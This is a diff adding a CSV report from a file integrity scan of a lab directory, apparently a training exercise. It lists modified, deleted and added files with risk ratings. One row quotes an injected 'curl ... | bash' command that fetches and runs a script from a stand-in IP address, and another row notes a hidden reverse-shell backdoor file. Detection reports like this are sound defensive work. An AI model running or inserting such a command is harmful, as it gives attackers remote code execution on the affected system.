@@ -1,0 +1,8 @@
+id,file_path,status,expected_change,risk_level,baseline_hash_prefix,scan_date,explanation
+1,lab/config/app.conf,MODIFIED,No,Medium,29bd9f083a6535b6,2026-11-22,Debug mode changed false->true (unapproved config change)
+2,lab/config/db.conf,DELETED,No,Medium,4049f94127abf0d4,2026-11-22,File deleted; app may fail or tampering hidden
+3,lab/docs/policy.txt,OK,n/a,None,fa245de4258e6aa4,2026-11-22,Only timestamp changed; content intact
+4,lab/docs/readme.md,MODIFIED,Yes,Low,63115ce3ad2f4fdd,2026-11-22,Approved change CHG-101 (contact line added)
+5,lab/scripts/backup.sh,MODIFIED,No,High,9e459507c4750184,2026-11-22,Malicious 'curl http://203.0.113.9/x.sh | bash' injected (remote code execution)
+6,lab/scripts/report.py,OK,n/a,None,261b46e61055f97b,2026-11-22,No change
+7,lab/scripts/.hidden_update.sh,ADDED,No,High,N/A,2026-11-22,Hidden file with reverse-shell command (backdoor/persistence)
